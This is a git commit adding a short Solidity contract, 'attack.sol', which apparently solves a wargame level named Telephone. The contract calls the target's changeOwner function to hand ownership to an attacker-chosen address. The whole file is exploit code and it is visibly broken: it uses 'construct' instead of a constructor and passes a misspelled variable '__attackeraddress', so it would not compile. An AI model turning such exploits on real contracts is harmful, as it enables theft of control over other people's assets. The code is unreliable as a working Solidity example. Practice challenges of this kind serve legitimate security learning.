70b5d5dec6140fa80d07a0612152af9763c4fd67
donghyeon <tsvz1234@gmail.com>
2024-06-18 23:36:26 +0900

    Create attack.sol

---
+++ Telephone/attack.sol
@@ -0,0 +1,17 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "./Telephone.sol";
+
+contract Attack {
+  Telephone public telephone;
+
+  construct(address _telephoneaddress) {
+    telephone = Telephone(_telephoneaddress);
+  }
+
+  function attack(address _attackeraddress) public {
+    telephone.changeOwner(__attackeraddress);
+  }
+}
